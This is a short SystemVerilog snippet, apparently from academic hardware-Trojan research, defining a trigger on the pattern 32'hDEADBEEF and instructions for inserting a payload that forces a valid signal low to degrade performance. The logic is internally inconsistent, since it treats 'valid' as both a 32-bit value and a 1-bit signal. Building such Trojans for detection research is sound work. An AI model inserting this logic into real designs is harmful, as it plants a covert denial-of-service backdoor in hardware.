/**
 * Combinational Availability Trojan - Code Snippet
 * 
 * Trust-Hub Category: Performance Degradation ✓ (category exists, gate-level only)
 * Literature Sources: Boraten & Kodi 2016, Jin & Makris 2008, Hoque et al. 2020
 * 
 * Description:
 *   Degrades performance by disabling ready signals
 *   
 * Trigger: Pattern match on valid
 * Payload: Disable valid
 * 
 * Author: Sharjeel Imtiaz (TalTech)
 * Date: January 2026
 */

// ============================================================
// TROJAN TRIGGER LOGIC (Condition-based)
// ============================================================

// Trigger pattern
localparam logic [31:0] TRIGGER_PATTERN = 32'hDEADBEEF;

wire trojan_active;
assign trojan_active = (valid == TRIGGER_PATTERN);

// ============================================================
// PAYLOAD MODIFICATION INSTRUCTIONS
// ============================================================
// Performance Degradation: Disable valid when triggered
//
// Integration Script Must Modify:
//
// IF valid is ready/valid signal:
//   Find: assign valid = ready_condition;
//   Replace: assign valid = trojan_active ? 1'b0 : ready_condition;
//
// This creates artificial wait states, degrading performance
// Note: For combinational logic, this is similar to DoS but with
//       different trigger conditions and lower severity